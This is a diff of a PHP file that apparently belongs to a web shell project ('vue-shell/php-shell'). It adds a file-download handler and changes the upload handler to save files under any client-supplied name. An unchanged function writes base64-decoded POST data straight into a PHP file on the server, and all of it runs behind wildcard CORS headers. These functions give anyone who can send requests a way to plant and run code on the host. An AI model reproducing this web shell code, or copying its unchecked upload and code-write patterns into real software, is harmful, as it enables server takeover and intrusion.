@@ -15,24 +15,29 @@ header('Access-Control-Allow-Methods: *');
 
 class File {
     function download() {
-        header('Content-Length:' . filesize('file.php'));
-        header('Content-Disposition:attachment;filename=' . basename('file.php'));
-        echo @file_get_contents('file.php');
-//        $F = 'file.php';
-//        $fp = @fopen('file.php', "r");
-//        if (@fgetc($fp)) {
-//            @fclose($fp);
-//            @readfile($F);
-//        } else {
-//            echo("ERROR:// Can Not Read");
-//        }
+        $file = 'test.js';
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition:attachment;filename=' . basename($file));
+        header('Content-Transfer-Encoding: binary');
+        header('Expires:0');
+        header('Content-Length:' . filesize($file));
 
+        set_time_limit(0);
+        $file = @fopen($file, 'rb');
+        while (!feof($file)) {
+            print(@fread($file, 1024 * 8));
+            ob_flush();
+            flush();
+        }
+
+//         echo @file_get_contents('download.php');
     }
 
     function upload() {
+//        return var_dump($_FILES);
         try {
             if ($_FILES['file']['error']) echo 'ERROR://upload fail';
-            else move_uploaded_file($_FILES['file']['tmp_name'], 'test.png');
+            else move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
         } catch (Exception $e) {
             echo 'ERROR://No Permission';
         }
@@ -201,9 +206,8 @@ class File {
     function change() {
         @file_put_contents('D:\safe\code\vue-shell\php-shell\test2.php', base64_decode($_POST['test']));
     }
-
 }
 
 $f = new File();
-$f->dir3();
+$f->upload();
 ?>
